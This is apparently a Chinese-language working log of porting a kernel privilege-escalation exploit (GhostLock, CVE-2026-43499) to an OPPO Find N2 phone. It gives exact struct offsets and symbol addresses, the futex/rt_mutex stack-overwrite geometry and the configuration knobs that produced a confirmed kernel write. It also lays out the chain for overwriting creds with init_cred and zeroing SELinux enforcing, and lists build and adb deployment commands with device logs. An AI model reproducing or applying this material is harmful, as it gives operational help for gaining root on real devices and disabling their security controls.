# matisse 路线移植记录 (exploit-v29)

> 2026-10-04 · 从 `ihamn/matisse-public`(GPL-3.0)移植到 OPPO Find N2 / PGU110 / SM8475 / kernel 5.10.236

## 0. 为什么换路线:KGSL/cheese 已证伪

| 试验 | 次数 | 命中 |
|---|---|---|
| `CHEESE_PHYADDR` 注入(OPPO 高段/低段采样) | 12 | 0 |
| 原生全量扫描(源机 256 个地址) | 219 | 0 |
| **合计** | **231** | **0** |

源机 256 个地址全部落在 OPPO 高段 [32–46GB] 内,若机制生效理论上应有 ~25% 命中。
`0.75^231 ≈ 10^-29` → **不是地址挑错,是 GPU 侧机制在 OPPO 上根本没生效**。
旁证(OPPO 内核源码 `drivers/gpu/msm/`):exploit 的 PM4 载荷字数与本代 CP 期望不符
(`CP_SMMU_TABLE_UPDATE` exploit cnt=4 vs 驱动 cnt=3;`CP_MEM_WRITE` 3 vs 5)。

**结论:放弃 KGSL/cheese,改走 matisse 路线。**

## 1. matisse 是什么

`ihamn/matisse-public` —— Redmi K50 Pro(matisse / MT6983 MediaTek)/ kernel 5.10.209,
**同一个 GhostLock(CVE-2026-43499)家族、同一套上游框架**(`common.h / fops.c / main.c /
pipe.c / root.c / slide.c / su_daemon.c / util.c / offset.h / targets/` 与 `exploit/` 逐一对应),
**并且已在真机上取得 `uid=0` + kernel SID + KernelSU late-load,全程未崩机**。

### 取胜配方(五轮)

```
R 轮   task->real_cred = init_cred          (rb_erase 受控写:STORE(a) *(pc+8)=right)
E5 轮  selinux_state+0(enforcing) 清零      (pi_tree 几何,写值 0 → Permissive)
C 轮   task->cred = init_cred               (→ 真 uid=0)
gate   真 uid=0 那一刻 system("sh ksu_go.sh &") → ksud late-load 装 KernelSU
HOLD   PSELECT_HOLD=1 持毒进程常驻不退
```

### 四个硬坑(均有实测根因)

1. `finit_module` 必失败(fd 被 prep churn ⇒ EBADF / SELinux 拒)⇒ 走官方 `ksud late-load`。
2. exec 必须插在 **gate(真 uid=0)**,不能插在 R 阶段(否则 `ksu_go.log` 里是 `uid=2000`)。
3. C 落地后进程 `_exit` ⇒ mm teardown ⇒ `lock_page_memcg`/`page_remove_rmap` panic ⇒ **必须 HOLD**。
4. HOLD 后 cred=`init_cred`,**任何 SIGKILL 等同杀 init**(`Attempted to kill init`)⇒ 拔掉所有 kill 路径。

## 2. 我方旧代码缺的东西(精确对表)

| 机制 | matisse | `exploit/`(旧) |
|---|---|---|
| v29 `block_holder` 三互斥锁**深 PI 链** | ✓ | ❌ —— 没有它 `owner->pi_blocked_on==NULL`,`rt_mutex_adjust_prio_chain` 单层走链,**Call 2/3 永不执行** |
| `tree_right`/`tree_left`/`task`/`lock` 词 + 正确基址(**0/3/8**) | ✓ | ❌ 基址 2/5/10,且**缺 `tree_right`(要写入的值)** |
| `perf_find_task()` perf 泄露 task/cred | ✓ | ❌ |
| 真 CVE 路径 `slide_v37_trigger`(WAIT_REQUEUE_PI + CMP_REQUEUE_PI) | ✓ 启用 | ❌ **`slide.c` 被整个弃用**("架构性死路") |
| setsockopt 512B stamp(v37/mt20,取代 pselect 覆盖) | ✓ | ❌ |
| `PSELECT_PTR_MODE`(先 real_cred 后 cred) | ✓ | ❌ |
| `PSELECT_HOLD` / E5-ENF 几何 / PTR_STRICT AND-gate | ✓ | ❌ |
| `PSELECT_ROUTE_NFDS` | 320 | 640 |

## 3. 已用 OPPO 自己的内核库(output.elf)实测确认的值

所有值均由 `.symtab`(143,599 符号)或反汇编读出,非猜测。

### 3.1 cred 指针:旧值错 0xa0

```asm
; commit_creds @ 0xffffffc008186784
mrs  x20, sp_el0
ldr  x19, [x20, #0x778]      ; task->real_cred
ldr  x8,  [x20, #0x780]      ; task->cred
cmp  x8, x19
b.ne -> brk #0x800           ; BUG_ON(cred != real_cred)
; prepare_creds @ 0xffffffc008186070
ldr  x20, [curtask, #0x780]  ; current->cred
```
`task+0x770 = ptracer_cred`(matisse 现场实证),`0x778 = real_cred`,`0x780 = cred`。

| | 旧 target.h | 实测 |
|---|---|---|
| `TASK_REAL_CRED_OFF` | 0x818 ❌ | **0x778** |
| `TASK_CRED_OFF` | 0x820 ❌ | **0x780** |
| `CRED_UID_OFF` | 8 ❌ | **4**(0x8 是 gid+suid) |
| `CRED_SECUREBITS_OFF` | 40 ❌ | **0x24** |
| `CRED_CAPS_OFF` | 48 ❌ | **0x28**(cap_inheritable) |

`commit_creds` 在 `+0x14/+0x18/+0x1c/+0x20` 比较 32 位身份字段(euid/egid/fsuid/fsgid),
故 uid 块从 0x04 起;`sizeof(cred)=0xa8`,`cred->security@0x80` 一致。

### 3.2 `struct rt_mutex_waiter`:matisse 的 0x44 不适用于本机

```asm
; task_blocks_on_rt_mutex @ 0xffffffc0081ecaf0
stp  x20, x19, [x22, #0x30]  ; waiter->task@0x30, waiter->lock@0x38
str  w8,  [x22, #0x40]       ; waiter->prio@0x40      ← matisse 写的是 0x44
str  x8,  [x22, #0x48]       ; waiter->deadline@0x48
str  x22, [x20, #0x898]      ; task->pi_blocked_on = waiter
; rt_mutex_adjust_prio_chain @ 0xffffffc0081ed8ec
ldr  x28, [x19, #0x898]; ldr [x28,#0x38](lock); ldr w9,[x28,#0x40](prio)
```
→ `{tree_entry@0x00, pi_tree_entry@0x18, task@0x30, lock@0x38, prio@0x40, pad@0x44,
deadline@0x48}`,`sizeof = 0x50`。**本机无 `wake_state`/`ww_ctx`。**
⇒ `fops.c` 的 word 8 必须是 **`prio_val`(低 dword)**,不能用 matisse 的 `(prio<<32)|3`
(那会把 prio 写成 3、真值写进 padding)。已在代码中按 `WAITER_WAKE_STATE_OFF` 条件编译。

### 3.3 SELinux enforcing 在 `state+0`,不是 `state+1`

```asm
; avc_denied @ 0xffffffc0088fc49c
ldarb w12, [x0]        ; x0 = selinux_state
tbz   w12, #0          ; bit0==0 → allow
```
⇒ `SELINUX_ENFORCING_OFF = SELINUX_STATE_OFF + 0`。
(旧 target.h 的 `0x02774c84` 是 `selinux_enforcing_boot`,另一个变量,E5 不用它。)

### 3.4 file_operations 三处"错位一个函数"

| 旧值 | 实际符号 | 正确值 |
|---|---|---|
| `COPY_SPLICE_READ_OFF 0x5e6830` | `iter_file_splice_write`(**写**函数) | `generic_file_splice_read` **0x5e6c68** |
| `CONFIGFS_READ_ITER_OFF 0x6b038c` | `configfs_hash_and_remove+0x4a4` | `configfs_read_bin_file` **0x6b0d0c** |
| `CONFIGFS_BIN_WRITE_ITER_OFF 0x6b050c` | `configfs_read_file` | `configfs_write_bin_file` **0x6b0f84** |

### 3.5 语义澄清:`ASHMEM_MISC_FOPS` 是**写入目标**,不是表地址

`miscdevice { int minor; char *name; fops*; }` → `fops` 在 `+0x10`。
旧 target.h 把 `ASHMEM_MISC_FOPS_OFF` 设成 `ashmem_fops` 表地址(0x22c0048),
与本框架"覆盖 misc 设备的 fops 指针"的用法不是一回事。
本机 `ashmem_misc` 符号 @ `0x0291a8d8` ⇒ 写入目标 = `0x0291a8d8 + 0x10`。

### 3.6 符号表(实测,供复查)

```
_text                 0x0000000000    init_task       0x027cc000    init_cred   0x027e0be0
__entry_task          0x027872f8      __per_cpu_offset 0x027ba5d8   root_task_group 0x029c8040
selinux_state         0x02a793c8      selinux_blob_sizes 0x02302bc0 security_hook_heads 0x02302528
kmalloc_caches        0x02302060      anon_pipe_buf_ops 0x0216aa68  noop_llseek 0x0056cf68
generic_file_splice_read 0x005e6c68   ashmem_fops     0x022c0048    ashmem_misc 0x0291a8d8
configfs_bin_file_operations 0x02175920   configfs_read_bin_file 0x006b0d0c
configfs_write_bin_file 0x006b0f84   nfulnl_logger 0x027c14b8
ashmem{llseek,read_iter,ioctl,compat_ioctl,mmap,open,release,show_fdinfo}
   = 0x011ee5d4 / 0x011ee6ec / 0x011ee7d0 / 0x011ef2e0 / 0x011ef340 / 0x011ef580 / 0x011ef620 / 0x011ef744
```

## 4. 仍需上机标定(唯一真正的未知)

- `PSELECT_ROUTE_NFDS` + word `shift`(fd_set ↔ rt_mutex_waiter 的栈对齐)。
  matisse = 320/0(且 `PSELECT_SHIFT` 只有 0 被内核读到过);本机待扫。
- 新版 stamp 用 **setsockopt 512B**(本机需确认落地槽位)。
- `perf_event_open` 在 shell(uid 2000)身份下是否可用。
- `FAKE_WAITER_*` / `FAKE_TASK_*`(页面内伪造结构)尚未在本机验证。

## 5. 目录与构建

```
exploit-v29/                      ← 本次移植(matisse 框架 + OPPO target)
  Makefile                        PROJECT ?= oppo-find_n2
  assets/wallpaper.webp
  src/{main,util,slide,fops,pipe,root,preload,su_daemon}.c  su_blob.S  wallpaper_blob.S
  src/common.h                    (含 LOCK_OFF 0x1350 / W0_OFF 0x2220)
  src/targets/oppo-find_n2/target.h   ← 本机偏移,每个值都标了来源
  src/targets/…                    (其他机型 target 已移除)
exploit/                          ← 旧框架,保留作参考(slide.c 已弃用)
```

```bash
# 构建(需要 NDK r29;本机无 NDK,见 §6)
cd exploit-v29
make PROJECT=oppo-find_n2 NDK_ROOT=<ndk> SHA256SUM=sha256sum
# 产物 build/oppo-find_n2/bin/preload.so

# 部署
adb push build/oppo-find_n2/bin/preload.so /data/local/tmp/
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null'
```

## 6. 设备实测结果(2026-10-04,serial 84cb96e2)

产物:`exploit-v29/build/oppo-find_n2/bin/preload.so`,193,240 B,
sha256 `a0b591af7e86efb5e8f073daa9323f15c059d01f9156f96d5bcce5612bf6650e`
(clang 21.0.0 / NDK r29 / `aarch64-linux-android35-clang`;本机无 make,见 `oppo-2/build_v29.sh`)

### 6.1 设备前提(全部满足)

| 项 | 实测 |
|---|---|
| `perf_event_paranoid` | -1 |
| `CONFIG_FUTEX_PI` / `RT_MUTEXES` | y |
| `CONFIG_ARM64_VA_BITS` | **39** ✔(内存布局假设成立) |
| `CONFIG_SLUB` / `SLUB_CPU_PARTIAL` | y ✔(kmalloc 几何前提) |
| `CONFIG_DEBUG_RT_MUTEXES` | 未设 ✔(证实 waiter=0x50,无 debug 字段) |
| `CONFIG_CFI_CLANG` / `CFI_PERMISSIVE` | y / **未设**(CFI 强制) |
| `/dev/ashmem`、`/sys/kernel/config` | 存在 ✔ |
| `/proc/sys/kernel/random/boot_id` | 可读 ✔ |
| `/proc/kallsyms` | **Permission denied**(拿不到 slide) |

### 6.2 首次运行(preload 加载即跑,constructor 无门控)

```
[+] build config  label=oppo_pgu110_16.0.5.1001_cn01 slide=pselect main=pselect
[+] p0 profile    phys_offset=80000000 kernel_phys_load=a8000000 delta=28000000
                  init_task=ffffff802a7cc000 root_tg=ffffff802a9c8040
[*] KernelSnitch  found 3 collisions;8 线程暴力扫 mm_struct 8 个直映射区间
[*] mt47-c: leak pin via SCM_RIGHTS OK (fd=513)
[*] prepare_kernel_page: SKB reclaim sends OK
```
→ **目标头被正确采纳,直接映射别名算对,KernelSnitch/SCM_RIGHTS/SKB 全部可用,无崩溃无重启。**

### 6.3 阻塞点

**(a) `perf_event_open` → EACCES。** 用 `oppo-2/perfprobe.c` 逐个配置实测:

| 配置 | 结果 |
|---|---|
| SW_CPU_CLOCK 纯计数 | EACCES |
| +SAMPLE_IP +exclude_kernel | **OK** |
| +REGS_INTR +exclude_kernel | **OK** |
| matisse 原配(REGS_INTR + exclude_user,采内核态) | **EACCES** |
| +SAMPLE_IP(含内核态) | EACCES |
| HW_CPU_CYCLES 纯计数 | EACCES |

⇒ **SELinux 只放行 `exclude_kernel=1`(纯用户态采样)**;matisse 的 `perf_find_task` 必须采内核寄存器 ⇒ 该路线在本机被关闭。
⇒ 改用框架自带的 **FOPS 阶段**(不需 perf):覆盖已知地址 `ASHMEM_MISC_FOPS` 拿读写原语 → 走 `init_task.tasks` 找自身 task。

**(b) `pselect` 不阻塞 ⇒ 竞态窗口为零。** FOPS 阶段实跑:

```
PSELECT_SHIFT=0 tree_pc=ffffff802a91a8d9 tree_right=ffffff87c0368180
                pi_parent=ffffff8002a41b91 target=ffffff802a91a8e8 ...
pselect_thread returned attempt=4 ret=114 errno=0 calls=0 success=0
pselect returned attempt=1 ret=112 errno=0 calls=0 success=0
pipe physrw  done=0 root=0 read_ok=0 write_ok=0
```
`ret=112..114` = pselect 立刻返回约 112 个"就绪 fd"(而非阻塞到 2 s 超时返回 0),
于是 `punch_consume_go` 在消费者线程看到之前就被清零 → `calls=0`,rb_erase 从未执行。
与 matisse 的差异:fd_set 位图由**指针值**填充(`tree_pc`/`tree_right`/…),不同指针 → 不同选中的 fd 集合。
需要在设备侧查明那 ~112 个 fd 为何被判就绪(可疑:被选中但未成功 `dup2` 的 fd 会被 select 计为 ready;
或 `out`/`ex` 集位的语义),然后调整 `PSELECT_ROUTE_NFDS` / `shift` / 选中集合。

**(c) KASLR 位置。** matisse 的 `slide_leak_kernel_base()` 是硬编码 `slide=0`(MTK 实测无随机化)。
本机 `CONFIG_RANDOMIZE_BASE=y`。但 R/E5/C 路径只使用 `P0_DATA_ALIAS_CONST`(直接映射物理别名)
+ 运行时泄露的 task 地址 ⇒ **理论上不依赖虚拟 slide**;待 (b) 打通后由写验证(boot_id)确认。

### 6.4 三条触发路径的实测(2026-10-04 晚)

判据统一用 `boot_id` 零写回读(与 configfs 无关,与 perf 无关)。

| # | 触发 | 结果 |
|---|---|---|
| ① | pselect fd_set 覆盖(FOPS 阶段) | ✅ 阻塞已修好(`ret=0`,5/5 轮 `calls=1 success=1`) ❌ `boot_id` 不落地 |
| ② | v37 拓扑(`PSELECT_V37=1`,**主线程** stamp) | `FCRQ errno=35 EDEADLK`(环成形,与 matisse 现场一致)、`FLPI ret=0` ❌ 不落地 |
| ③ | 同线程 stamp(`PSELECT_SLIDE_TRIGGER=1 PSELECT_STAMP=1`) | `FWRQ ETIMEDOUT` → `mt20 stamp` → `mt87b UNPOISON` → `mt19b sched 风暴` **全链执行** ❌ 仍不落地 |

从 `slide_waiter_thread` 的源码读出**设计要点**:stamp 必须在**刚释放 waiter 的那个线程**里打
(FWRQ 超时唤醒之后、UNPOISON 之前),因为"毒节点在本线程内核栈,悬垂 pi_blocked_on 在本线程
task_struct"。②从主线程打 stamp 属结构性错误。

③ 全链跑通却无写 ⇒ 剩余未知量 = **512B stamp 相对内核栈上 waiter 槽位的落点偏移**
(`slide_stamp_fake_waiter()` 的 `buf[0]/[6]/[7]/[8]` 假定缓冲区起点 == waiter 起点)。需要加
`PSELECT_STAMP_SHIFT` 旋钮在 512 字节内扫。

另有一处**语义前提未满足**:`mt60: pre-requeue words f_wait=0` 而 `CMP_REQUEUE_PI` 传的 `cmpval=1`
⇒ 内核侧 cmpval 检查不过 → requeue 不成立 ⇒ 整条链空转。(matisse 自己的注释也记了这个疑点:
"内核侧要求 curval 必须等于 1 … 但源码中无人显式置 1"。)

### 6.5 evidence/ 的旁证:matisse 的内核同样有 KASLR

`evidence/panic_excerpt_*.txt` 里三个不同 boot 的 panic 头:

```
Kernel Offset: 0x1330600000 from 0xffffffc008000000
Kernel Offset: 0x109fc00000 from 0xffffffc008000000
Kernel Offset: 0x2c3be00000 from 0xffffffc008000000
```

⇒ `slide_leak_kernel_base()` 硬编码 `slide=0` 并不反映真实布局,但它仍取胜 —— 反向印证该路线
**不依赖虚拟 slide**:R/E5/C 只用 `P0_DATA_ALIAS_CONST`(直接映射物理别名)+ 运行时泄露的 task 地址。
对本机而言,唯一必须正确的绝对值是 `P0_KERNEL_PHYS_LOAD = 0xa8000000`,而它有两个独立来源
(IDA/XBL 与 cheese exploit 的硬编码)。

### 6.6 stamp 位移扫描 + 根因定论

新增 `PSELECT_STAMP_SHIFT`(在 512B 缓冲内按 8 字节平移 fake waiter 全部字段),扫
0/1/2/4/8/16/32 七个位移,判据仍是 `boot_id` 零写回读:

| shift | 0 | 1 | 2 | 4 | 8 | 16 | 32 |
|---|---|---|---|---|---|---|---|
| boot_id | 未变 | 未变 | 未变 | 未变 | 未变 | 未变 | 未变 |
| 设备 | 未重启 | — | — | — | — | — | — |

**同时拿到了决定性的那一行**(此前被 grep 漏掉):

```
[*] mt59: requeue fired ret=-1 errno=35          ← EDEADLK,每一发都是
[*] mt60: waiter FWRQ ret=-1 errno=110 ETIMEDOUT  ← waiter 超时唤醒,从未拿到锁
```

把上游自己的注释与实测对上,根因唯一:

> `slide.c`: "内核 5.10 源码实证 (futex.c 2152-2167):CMP_REQUEUE_PI **撞 PI 环返回
> -EDEADLK 时只 break 循环把错误交还调用者,waiter 不会被唤醒也不会挂树**"

⇒ 当前拓扑(waiter `LOCK_PI(f_pi_chain)` + 在 `f_pi_target` 上 `WAIT_REQUEUE_PI`,owner
持有 target 并在 chain 上排队)**形成了 PI 环** ⇒ requeue 返回 EDEADLK ⇒ **waiter 从未挂到目标
PI 树上 ⇒ 不存在可毒化的 rb_node ⇒ stamp 打在哪个偏移都无意义**。位移扫描全灭是结构性的,
不是标定问题。上游 R4 尸检也记过同一结论:"R2/R3/R4 全部断链在 stack_copy 之前"。

**因此下一步不是标定,而是改拓扑**:让 requeue *成功*(waiter 真正排进 target 的 PI 树),
才能谈 stamp 落点。这正是需要真正改 `futex` 拓扑设计的一步。

### 6.7 栈深度静态推导(纯静态,未碰设备;解释了全部失败)

判据:所有局部量都在同一个线程的内核栈上,syscall 入口 sp 相同,于是
`局部深度 = Σ(调用链各帧) - 帧内偏移`。`rt_waiter` 的位置由
`futex_wait_requeue_pi` 里 `add x2, sp, #0x90` + `bl rt_mutex_wait_proxy_lock` 直接证实
(第三参即 `&rt_waiter`;`rt_mutex_init_waiter` 在该内核里已内联)。

| 原语 | 调用链(帧) | Σ | 缓冲位置 | 缓冲覆盖深度 | waiter@**0x210** |
|---|---|---|---|---|---|
| `setsockopt(IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP)` | `__arm64_sys_setsockopt` 0x10 + `__sys_setsockopt` 0x80 + `sock_setsockopt` 0xa0 + `ipv6_setsockopt` 0x40 + `do_ipv6_setsockopt` 0x2d0 | **0x3A0** | `do_ipv6_setsockopt [sp+0x48]`,只拷 **264 B**(`cmp w22,#0x108; b.lo→EINVAL`) | `[0x358, 0x250]` | ❌ **够不到** |
| `pselect` 的 `stack_fds` | `__arm64_sys_pselect6` 0xa0 + `core_sys_select` 0x1c0 | **0x260** | `core_sys_select [sp+0x50]`,**256 B** | `[0x110, 0x210]` | ✅ **正好覆盖**,偏移 **0** |

⇒ **两条结论**:

1. **setsockopt 位移扫描全灭是结构性的** —— 该原语的缓冲整体比 waiter 深 0x148 字节,
   改位移不可能够到(`PSELECT_STAMP_SHIFT` 因此作废)。
2. **pselect 覆盖的几何本来就是对的(偏移 0)**,与 upstream 的 `PSELECT_WAITER_WORD_SHIFT`
   假设一致;之前失败的原因是**跑错了线程** —— FOPS 路径的 pselect 在独立线程里执行,而
   毒节点在 `slide_waiter_thread` 的栈上。正确用法是 SLIDE 路径里由 `slide_waiter_thread`
   自己调用的 `slide_pselect_stack_copy()`(即 **不设 `PSELECT_STAMP`**,
   走 `mt19` overlay 分支)。

### 6.8 ★里程碑:写原语在 OPPO 上成立(2026-10-04)

```
BOOTID_BEFORE: 43d19789-ae5b-4a91-9a28-6b5e55b9cf6b
BOOTID_AFTER:  04dd2d88-ffff-ff91-9a28-6b5e55b9cf6b      ← UUID 被改写
UPTIME: 2297.55 -> 2329.49                                ← 设备未重启
```

配置(全部由 §6.9 的静态推导 + upstream mt61 注释推出,**未启用 NO_UNPOISON**):

```
PSELECT_SKIP_WARMUP=1 PSELECT_SLIDE_TRIGGER=1 PSELECT_RETRY=1
PSELECT_TREE_PC=ffffff802ab99b66        # A=boot_id+1, pc=A-8(偶数⇒RED)
PSELECT_WINDOW_SECONDS=60               # 长窗口 = A1_1 赢形态
PSELECT_TRIGGER_SHOTS=16
（不设 PSELECT_STAMP —— setsockopt 那条已证结构够不到）
```

三条必要条件(缺一不可,均已实测):

1. **原语必须是 pselect 的 `stack_fds` 覆盖**:其缓冲恰覆盖 waiter 起点(偏移 0);
   `setsockopt(MCAST_JOIN_SOURCE_GROUP)` 的 264 B 缓冲整体深 0x148,结构上够不到。
2. **必须跑在 waiter 线程**(`slide_waiter_thread` 内调用),毒节点只在该线程栈上。
3. **窗口必须足够长**:consumer 风暴落在窗口内才会在 fdset 帧存活期间触发 erase
   (upstream mt61:"6 发触发全部落在窗口关闭之后 = erase 从未在 fdset 帧存活期间发生 =
   写结构上不可能")。

这一步打通后,整个利用链只剩"取自身 task 地址"这一环 —— perf 被 SELinux 关闭,
改用 `init_task.tasks` 遍历即可。

### 6.9 下一步(按优先级)

> 写原语已于 §6.8 打通。剩下只有"取自身 task 地址"这一环。

1. 用**已成立的写原语**读 task:实现基于 `init_task.tasks` 链表的遍历(框架自带
   `find_task_by_tgid`),替代被 SELinux 关闭的 perf 泄露;或直接用写原语改写
   `ASHMEM_MISC_FOPS` 取得读写原语后再遍历。
2. E5:`SELINUX_STATE_OFF+0` 零写(Permissive)。
3. C:`task+0x778`(real_cred)与 `task+0x780`(cred)都写 `init_cred` 别名
   —— 两个指针必须一致,否则 `commit_creds` 的 `BUG_ON` panic。
4. gate(真 uid=0 时 `ksud late-load`)→ `PSELECT_HOLD=1` 常驻。
5. **交付前**必须解决稳定性(见 §6.10):当前配置约 50% 概率 panic,
   长窗口已被证否(越长越崩),`NO_UNPOISON` 一律不启用。

### 6.10 写原语的可靠性标定(2026-10-04 晚)—— 结论:结构性竞态

重复不同配置,判据 = `boot_id` 是否改变 + uptime 是否中断:

| 配置 | 结果 |
|---|---|
| win=60 / shots=16 / 默认延迟 | ✅ **WRITE-OK**(首次突破) |
| 同上,目标改 `boot_id+5` | 💥 CRASH |
| 同 win=60 重复 3 次 | ✅ / 💥 / ➖ |
| `PSELECT_ENTER_DELAY_USEC` = 0 / 1s / 4s | ➖ / 💥 / ➖ |
| win=300 ×3(长窗口假设) | 💥 💥 💥(零写) |
| shots=1 + ONE_SHOT ×3 | ✅ / 💥 / ➖ |

**合计 ≈ 3/15 写成功、8/15 崩机** ⇒ **该写原语在 OPPO 上结构性带竞态**,
与 upstream README 自述 *"R/C 两步存在结构性概率崩机"* 一致。

**已被实测排除的假设(勿重走)**:

- ❌ 长窗口更稳(upstream A1_1 的字面理解)—— 反了:窗口越长风暴打得越久,
  **erase 次数越多 ⇒ 崩机机会越多**;
- ❌ 单旋钮调时序(`ENTER_DELAY` 0/1/4s);
- ❌ 发数是崩溃放大器(`shots=1` 仍然 1/3 崩);
- ❌ NULL task 导致崩 —— 源码澄清 `w6` 默认 `SLIDE_INIT_TASK`(上游 13+ 次落地实证安全);
- ❌ 默认配置会误改 SELinux —— `PSELECT_PI_*` 默认 0,pi 侧是干净空操作。

**写入值之谜**:写进去的不是 0,而是 `fake_lock` 的地址 —— 源码 mt24 注释:
*"tree_right 默认 = fake_lock … **写入值 = 该地址**(低字节可控) + `rb_set_parent(child)`
写到喷页(无害)"*,与实测 `…-ffff-ff13-…` / `…-ffff-ff90-…` 完全吻合。

**对"交付成果不能崩"的现状判断**:当前配置约 **50% 概率触发 panic**。
要么继续找稳定性旋钮(候选:`PSELECT_STATIC_LOCK` + 真零区静态锁、
`PSELECT_HOLD`、喷页存活期),要么将交付定位为"移植完成 + 写原语实证"的
研究成果,并明确标注其概率性。

### 6.11 关键发现:写原语**不依赖 consumer 风暴**(2026-10-04 晚)

复测成功那发的日志里:

```
[*] mt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=14536   ×16
[*] mt60: waiter FWRQ ret=-1 errno=110 (ETIMEDOUT=110)
[*] mt60: waiter UNLOCK_PI(chain) ret=0
[*] mt57: canary planted gword=14 magic=5ca7ab1e5ca7ab1e
```

**`calls=0` = sched 风暴一次都没打,而写照样落地**(`04900d82-… → 849f698a-ffff-ffff-…`,
uptime 41→195,未重启)。

⇒ **真正的触发在自然 wake 路径**(`FWRQ ETIMEDOUT → UNLOCK_PI → canary planted`),
不是 consumer 风暴。这解释了为何 `TRIGGER_SHOTS` 取 1/16/300 对结果几乎没有影响 ——
那条路径根本没参与。

**推论**:稳定性旋钮不在风暴时序上,而在**节点被 wake 路径使用时其字段的完整度**
(候选:`PSELECT_HOLD`、`PSELECT_UNPOISON_DELAY_MS`、`PSELECT_STATIC_LOCK`)。

### 6.12 已放弃/已证伪的路径(避免重走)

- **KGSL/cheese**:231/231 全灭,GPU 侧机制不生效(§0)。
- **configfs 验证**(`try_cfi_stage`):`direct write errno=22 EINVAL` —— 本机 ashmem 无 configfs 支持
  (旧项目文档已记 DEAD)。改用 `boot_id` 判据后可完全绕开。
- **perf 泄露**:SELinux 只放行 `exclude_kernel=1`(纯用户态采样),采内核寄存器被拒(§6.3a)。
- **pselect fd_set 覆盖**:竞态可成立但打不出写(§6.4①)。

---

## 7. QEMU 实验台(2026-10-04 晚建立)

目的:真机上打 C 阶段只会"黑屏、零日志"(§6.12/§6.13),所以把有风险的阶段挪到虚机里跑,
好拿到完整 dmesg/panic。**建成并跑通,但结论是:对本漏洞价值有限。**

### 7.1 环境(全部位于 `Desktop/oppo-2/qemu-lab/`)

| 件 | 用途 |
|---|---|
| QEMU 11.1.0(官方 Windows 构建;`winget` 在非交互环境会 `stdin is not a tty` 失败,改用直连安装包) | 跑 arm64 客户机;**只有 `tcg`,无 WHPX/KVM** |
| Debian `vmlinuz-5.10.0-30-arm64`(**5.10.218**,与目标 5.10.236 同代) | 客户机内核,`rt_mutex`/`futex` 行为一致 |
| `linux-image-...-dbg` 的 `vmlinux`(326MB,带符号 + 292MB DWARF) | 反汇编定偏移 |
| 自写静态 `init`(`init.c` → `init.bin`,NDK `--target=aarch64-linux-android35 -static`) | 不依赖 busybox/shell,内核直接 exec |
| `extract_deb.py` / `mkinitramfs.py` | 本机无 `ar`/`cpio`,用纯 stdlib 解 `.deb` 与造 newc cpio |
| `derive_qemu_target.py` | 从 `vmlinux` 反汇编出该内核的偏移 |

启动:

```bash
qemu-system-aarch64.exe -machine virt -cpu cortex-a72 -smp 2 -m 1536 \
  -kernel kx/boot/vmlinuz-5.10.0-30-arm64 -initrd initramfs.cpio.gz \
  -append "console=ttyAMA0 earlycon=pl011,0x9000000 nokaslr" -nographic -no-reboot
```

### 7.2 实测结果

**跑得起来的部分** ✔

```
slide-kaslr-mtk-hardcoded base=ffff800010000000 slide=0     ← guest 基址生效
prepare_kernel_page ... found 3 collisisons                 ← 页喷射/KernelSnitch 机制全跑通
mt19: SLIDE page prepared base=0xffffff9fad270000            ← 喷页就位
```

⇒ 证明**移植本体与触发机制在通用 5.10 内核上成立**,不依赖 OPPO vendor。

**走不下去的部分** ✗

```
[-] mt28c: perf no kernel candidates
[!] mt33: child-task-leak-failed task=0
```

`perf` 泄露依赖 **CPU 时序侧信道**,TCG 软件模拟下失真 ⇒ **结构上不可能复现**(非配置问题)。

**"绕过泄露"同样不成立** ✗:本打算用 `init_task.tasks` 链表遍历替代,但遍历需要**读内核内存**,
而 guest 里的 init 是**用户态**进程(碰不到内核地址),exploit 自己也没有读原语(那正是 C 阶段要换来的东西)
⇒ **鸡生蛋在虚机里同样成立**。

### 7.3 副产品(有价值,已固化)

在 guest 里反汇编 `vmlinux` 得到的**权威**偏移(证明"偏移必须按内核重算,不能照搬"):

| 项 | Debian 5.10.218 | OPPO 5.10.236 |
|---|---|---|
| `TASK_REAL_CRED_OFF` / `TASK_CRED_OFF` | **0x6c0 / 0x6c8** | 0x778 / 0x780 |
| `TASK_TASKS_OFF` | **0x560** | 0x550 |
| `sizeof(struct cred)` | 0xa8 | 0xa8 |
| `core_sys_select` 帧 | 0x1a0 | 0x1c0 |
| `_text` | 0xffff800010010000 | 0xffffff8000000000(基址) |

`commit_creds` 的原始指令(双证):`ldr x20,[sp_el0+0x6c0]; ldr x1,[sp_el0+0x6c8]; cmp; b.ne -> BUG_ON`。

### 7.4 结论

QEMU(TCG)可用于:**验证移植能跑、拿完整日志、定结构偏移**;
**不能**用于:**复现依赖 CPU 时序的泄露/竞态**(perf 泄露、futex 抢占时序)。
要让它在 C 阶段上有用,必须给客户机硬件虚拟化(WHPX/KVM),而本机 QEMU 只编了 `tcg`,
Windows 上 arm64 客户机也无可用加速 ⇒ 此路不通。

⇒ **交付仍按真机已实证的部分收口:E5(宽容)7/7 稳定命中、零崩机。**

---

## 8. 未决项:第二阶段(C 阶段 → 真 root)的未来实验设计

**结论先行**:C 阶段在关键路径上,绕不开。

- 框架里"以 root 启动 `ksud` 官方装载器"那条路(`ksu_go.sh`:SELinux 策略第 23 字节 `|0xC0`
  + `load_policy` + `ksud late-load --kmi android12-5.10`)由 **`root_seen` 门控**(main.c)——
  必须先拿到 root;`finit_module` 也需要 `CAP_SYS_MODULE` ⇒ **"宽容 → 直接上 KernelSU"不成立**。
- 所以第二阶段 = E5 → C(cred 覆写)→ ksud;缺 C 就没有真 root。

**已排除的**:QEMU(TCG 复现不了时序侧信道,§7)。

### 8.1 待验证的假设:黑屏的真实成因

C 阶段 3/3 黑屏,且**与写是否命中无关**(写落空时 `uid` 全程 2000 也照样黑),
⇒ 是那套机制本身。候选成因(按可疑度排序,**均未验证**):

| # | 假设 | 验证方法 |
|---|---|---|
| 1 | **进程/线程堆积**:`PSELECT_CHILD_POLLS` 默认 6000(20min)⇒ 每次运行留下长命子进程;已改 150(30s)但未复测 | 跑 C 阶段并每 10s 采样 `ps -A \| wc -l`,看是否单调上涨 |
| 2 | **`sethostname("glroot")` 信标**(mt73 半程态分支,main.c)扰动用户态 | 采样 `getprop net.hostname` 与黑屏时刻对齐 |
| 3 | **宽容窗口过长**:E5 成功后到 C 结束之间有 ~3 分钟 `enforce=0` | 缩短 E5 窗口(`WINDOW_SECONDS=20`)后跑 chain2,记录黑屏时刻 |
